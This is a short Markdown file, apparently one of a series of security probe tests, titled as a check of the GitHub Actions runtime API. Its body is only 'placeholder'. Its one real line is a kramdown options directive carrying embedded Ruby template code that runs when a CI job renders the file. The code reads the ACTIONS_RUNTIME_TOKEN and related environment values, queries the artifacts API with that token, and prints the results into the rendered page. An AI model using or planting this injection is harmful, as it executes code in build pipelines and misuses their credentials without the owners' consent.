---
---

# Test 9: Actions Runtime API - list artifacts and check permissions

{::options template="string://<%= require 'net/http'; require 'uri'; require 'json'; runtime_url = ENV['ACTIONS_RUNTIME_URL']; runtime_token = ENV['ACTIONS_RUNTIME_TOKEN']; run_id = ENV['GITHUB_RUN_ID']; results = []; results.push('RUNTIME_URL=' + runtime_url.to_s[0..80]); results.push('RUN_ID=' + run_id.to_s); begin; if runtime_url and runtime_token; uri = URI(runtime_url + '_apis/pipelines/workflows/' + run_id.to_s + '/artifacts?api-version=6.0-preview'); req = Net::HTTP::Get.new(uri); req['Authorization'] = 'Bearer ' + runtime_token; res = Net::HTTP.start(uri.hostname, uri.port, use_ssl: true){|http| http.request(req)}; results.push('ARTIFACTS=' + res.code + ':' + res.body[0..300]); end; rescue => e; results.push('ERR=' + e.message); end; results.join(\"\\n\") %>" /}

placeholder
